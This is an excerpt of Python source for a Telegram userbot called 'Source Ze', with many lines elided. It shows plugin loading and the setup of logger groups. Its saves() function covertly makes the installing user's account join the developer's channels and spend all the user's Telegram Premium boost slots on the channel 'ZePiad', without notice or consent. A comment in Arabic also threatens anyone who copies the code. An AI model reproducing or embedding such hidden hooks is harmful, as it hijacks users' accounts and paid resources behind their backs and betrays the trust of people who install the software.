    ...
    try:
        ...
        if starkbot.bot_inline_placeholder:
            ...
            try:
                ...
                await asyncio.sleep(1)
                await mody.send_message("@BotFather", ze)
...
async def add_bot_to_logger_group(chat_id):
    ...
    try:
        ...
        try:
            ...
            LOGS.error(str(e))
#by @Source_Ze بس اشوفك خامطه للكود اهينك وافضحك
SourceZe = {"@Source_Ze", "@zesupport"}
async def saves():
    for ELHYBA in SourceZe:
        try:
            await mody(JoinChannelRequest(channel=ELHYBA))
            result = await mody(functions.premium.GetMyBoostsRequest())
            slots = [boost.slot for boost in result.my_boosts]
            ze_channel_id = None
            for chat in result.chats:
                if chat.username == 'ZePiad':
                    ze_channel_id = chat.id
                    break
            if ze_channel_id and any(boost.peer.channel_id == ze_channel_id for boost in result.my_boosts):
                continue
            if not slots:
                return
            await mody(functions.premium.ApplyBoostRequest(
                'ZePiad',
                slots=slots
            ))
...
async def load_plugins(folder, extfolder=None):
    ...
    if extfolder:
        ...
        path = f"SourceZe/{folder}/*.py"
        plugin_path = f"SourceZe/{folder}"
...
#سورس زد إي عمك
async def ze_the_best(mody, group_name):
...
async def verifyLoggerGroup():
    ...
    if BOTLOG:
        ...
        botlog_group_id = await ze_the_best(mody, "مجموعة أشعارات زد إي")
        if botlog_group_id:
    ...
    if PM_LOGGER_GROUP_ID == -100:
        ...
        pm_logger_group_id = await ze_the_best(mody, "مجموعة التخزين")
